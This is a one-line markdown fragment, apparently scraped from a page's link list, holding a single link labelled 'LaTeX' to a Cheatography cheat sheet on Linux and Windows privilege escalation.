- **  [LaTeX](https://cheatography.com/blacklist/cheat-sheets/linux-windows-privilege-escalation/latex/)